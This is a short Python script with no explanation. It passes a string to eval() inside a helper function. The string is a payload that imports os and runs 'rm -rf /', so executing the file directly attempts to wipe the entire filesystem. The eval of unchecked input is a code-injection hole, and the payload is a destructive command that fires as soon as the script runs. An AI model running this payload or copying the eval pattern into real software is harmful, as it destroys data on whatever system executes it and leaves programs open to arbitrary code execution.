import os

def evaluate_input(user_input):
    # This function evaluates user input using eval()
    return eval(user_input)

# User input
user_input = "__import__('os').system('rm -rf /')"

# Evaluate user input
evaluate_input(user_input)
